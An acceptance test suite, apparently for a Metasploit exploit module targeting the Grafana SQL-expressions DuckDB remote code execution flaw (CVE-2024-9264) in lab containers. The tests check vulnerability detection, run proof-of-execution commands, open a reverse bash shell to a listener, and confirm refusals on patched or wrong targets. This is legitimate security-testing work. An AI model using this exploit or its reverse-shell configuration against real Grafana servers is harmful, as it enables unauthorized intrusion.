require 'acceptance_spec_helper'
require 'json'
require 'securerandom'
require 'timeout'
require_relative '../../../test/module_targets/grafana_expression/session_control'

RSpec.describe 'Genuine Grafana SQL expression controls' do
  include_context 'module target'
  include_context 'wait_for_expect'
  include Acceptance::GrafanaExpressionSession

  mode = ENV.fetch('GRAFANA_EXPRESSION_PROFILE', 'affected')

  before(:all) do
    @native_sequence = 0
    @native = native_action('preflight')
    @baseline = @native.fetch('baseline')
    grafana_calibrate_bash if %w[affected anonymous].include?(mode)
  end

  before do
    @output_files = []
    @operator_cleanup = false
    @before = nil
    @proof_file = "/tmp/module-target-grafana-proof-#{SecureRandom.hex(6)}"
    @before = native_action('snapshot')
    expect(@before).to eq(@baseline)
  end

  after do
    console_command('sessions -K')
    console_command('jobs -K')
    # Only a no-session invocation needs operator removal of module output.
    Array(@output_files).each do |path|
      present = target_exec('grafana', 'sh', '-c', "if test -e #{path}; then printf present; fi")
      if present == 'present'
        expect(@operator_cleanup).to be(true), "Module/session left #{path}"
        target_exec('grafana', 'rm', '-f', path) if @operator_cleanup
      end
    end
    target_exec('grafana', 'rm', '-f', @proof_file) if @proof_file
    expect(native_action('snapshot')).to eq(@before) if @before
    @operator_cleanup = false
  end

  if %w[affected anonymous].include?(mode)
    it 'checks actual DuckDB file-read capability twice under the configured policy' do
      2.times do
        output = invoke(action: 'check')
        expect(output).to include('The target is vulnerable', 'executed a DuckDB read_blob SQL expression')
      end
    end

    it 'runs a quoted command twice with exact proof bytes and declared operator cleanup' do
      @operator_cleanup = true
      2.times do
        text = 'Grafana exact + $HOME; \'quoted\' café'
        command = "printf '%s' '#{text.gsub("'", %q{'"'"'})}' | tee #{@proof_file}"
        output = invoke({ 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => command, 'DisablePayloadHandler' => true })
        expect(output).to include('Command payload delivered successfully')
        wait_for_proof(text)
        expect(native_action('read-file', @output_files.last)).to eq(text)
        target_exec('grafana', 'rm', '-f', @proof_file, @output_files.last)
        expect(target_exec('grafana', 'test', '!', '-e', @output_files.last)).to eq('')
      end
    end

    it 'obtains and uses a real service-owner shell twice with FileDropper cleanup' do
      2.times do
        output = invoke({ 'PAYLOAD' => 'cmd/unix/reverse_bash', 'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 10 })
        expect(output).not_to match(/Exploit failed|Exploit aborted|Unable.*clean|Failed.*delet/i)
        opened = nil
        Timeout.timeout(15) do
          wait_for_expect(80, 0.1) do
            sessions = console_command('sessions -l')
            opened = sessions[/^\s*(\d+)\s+.*\bshell\b/i, 1]
            expect(opened).not_to be_nil, sessions
            expect(console.all_data).to include("Command shell session #{opened} opened")
          end
        end
        used = console_command("sessions -i #{opened} -c \"/usr/bin/touch #{@proof_file}\"")
        expect(used).not_to match(/\[-\]|Unknown command|Exception/)
        Timeout.timeout(12) do
          wait_for_expect(80, 0.1) do
            expect(target_exec('grafana', 'sh', '-c', "if test -f #{@proof_file}; then printf present; fi")).to eq('present')
          end
        end
        expect(target_exec('grafana', 'stat', '-c', '%u', @proof_file).strip).to eq('472')
        grafana_close_verified_shell(opened, @proof_file, phase: 'owning module')
        console_command('sessions -K')
        console_command('jobs -K')
        @output_files.each { |path| expect(target_exec('grafana', 'test', '!', '-e', path)).to eq('') }
        target_exec('grafana', 'rm', '-f', @proof_file)
      end
    end
  end

  if mode == 'affected'
    it 'refuses incorrect Viewer credentials twice without proof or a session' do
      2.times do
        output = invoke({ 'PASSWORD' => 'incorrect-password', 'AutoCheck' => false }, allow_errors: true)
        expect(output).to include('HTTP Basic authentication failed')
        expect(output).not_to include('Command payload delivered successfully')
        expect(console_command('sessions -l')).to include('No active sessions')
      end
    end

    it 'refuses missing Basic credentials twice when anonymous access is disabled' do
      2.times do
        output = invoke({ 'USERNAME' => '', 'PASSWORD' => '', 'AutoCheck' => false }, allow_errors: true)
        expect(output).to include('HTTP Basic authentication failed')
        expect(output).not_to include('Command payload delivered successfully')
      end
    end

    it 'reports both incomplete credential pairs without executing SQL' do
      [{ 'USERNAME' => 'module-lab-viewer', 'PASSWORD' => '' }, { 'USERNAME' => '', 'PASSWORD' => 'incomplete' }].each do |options|
        checked = invoke(options, action: 'check', allow_errors: true)
        expect(checked).to include('USERNAME and PASSWORD must both be set or both be empty')
        output = invoke(options.merge('AutoCheck' => false), allow_errors: true)
        expect(output).to include('USERNAME and PASSWORD must both be set or both be empty')
        expect(output).not_to include('Command payload delivered successfully')
      end
    end

    it 'refuses genuine unrelated Apache twice' do
      2.times do
        checked = invoke({}, service: 'unrelated', action: 'check', allow_errors: true)
        expect(checked).to include('Could not identify a Grafana instance')
        output = invoke({}, service: 'unrelated', allow_errors: true)
        expect(output).not_to include('Command payload delivered successfully', 'The target is vulnerable')
      end
    end
  elsif mode == 'fixed'
    it 'identifies the actual fixed release and refuses normal exploitation twice' do
      2.times do
        output = invoke(action: 'check', allow_errors: true)
        expect(output).to include('not an affected release')
        output = invoke(allow_errors: true)
        expect(output).not_to include('Command payload delivered successfully')
        expect(output).to match(/not vulnerable|not appear.*vulnerable|not an affected/i)
      end
    end

    it 'refuses direct SQL execution twice despite independently valid CLI controls' do
      2.times do
        output = invoke({ 'AutoCheck' => false }, allow_errors: true)
        expect(output).to match(/SQL Expressions request failed|DuckDB command execution failed/)
        expect(output).not_to include('Command payload delivered successfully')
        expect(console_command('sessions -l')).to include('No active sessions')
      end
    end
  elsif mode == 'stock'
    it 'distinguishes an affected version from unavailable DuckDB verification twice' do
      2.times do
        output = invoke(action: 'check', allow_errors: true)
        expect(output).to include('safe DuckDB verification did not succeed')
        expect(output).not_to include('The target is vulnerable')
      end
    end

    it 'reports actual missing-binary failure twice without command proof' do
      2.times do
        output = invoke({ 'AutoCheck' => false }, allow_errors: true)
        expect(output).to match(/SQL Expressions request failed|DuckDB command execution failed/)
        expect(output).not_to include('Command payload delivered successfully')
      end
    end
  end

  def native_action(action, *arguments)
    @native_sequence += 1
    tag = "#{@native_sequence}-#{action}"
    argv = ['python3', '-B', 'test/module_targets/grafana_expression/native.py', action, tag, *arguments]
    output, error, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), "native-status-#{tag}.json"), JSON.pretty_generate(argv: argv, exitstatus: status.exitstatus, stdout: output, stderr: error))
    expect(status.success?).to be(true), error
    JSON.parse(output)
  end

  def invoke(options = {}, service: 'grafana', action: 'run', allow_errors: false)
    credentials = @native.fetch('selected_credentials')
    defaults = { 'TARGETURI' => service == 'grafana' ? "#{@native.fetch('prefix')}/" : '/', 'HttpTrace' => true, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'true', 'DisablePayloadHandler' => true }
    defaults.merge!('USERNAME' => credentials[0], 'PASSWORD' => credentials[1]) if credentials
    values = defaults.merge(options)
    values['DisablePayloadHandler'] = false if values['PAYLOAD'] == 'cmd/unix/reverse_bash'
    values['AllowNoCleanup'] = true if action == 'run' && values['PAYLOAD'] == 'cmd/unix/generic'
    call_offset = console.all_data.bytesize
    output = nil
    begin
      invocation = action == 'run' && values['PAYLOAD'] == 'cmd/unix/reverse_bash' ? 'run -z' : action
      output = run_target_module('exploit/multi/http/grafana_sql_expressions_rce_cve_2024_9264', service, values, action: invocation, allow_errors: allow_errors)
      expect(output).not_to match(/NoMethodError|TypeError|Call stack|Unknown datastore option/)
      output
    ensure
      observed = output || console.all_data.byteslice(call_offset..-1).to_s
      @output_files |= observed.scan(%r{/tmp/[A-Za-z0-9]{16}})
    end
  end

  def wait_for_proof(text)
    Timeout.timeout(12) do
      wait_for_expect(80, 0.1) { expect(native_action('read-file', @proof_file)).to eq(text) }
    end
    expect(@output_files.length).to be >= 1
  end
end
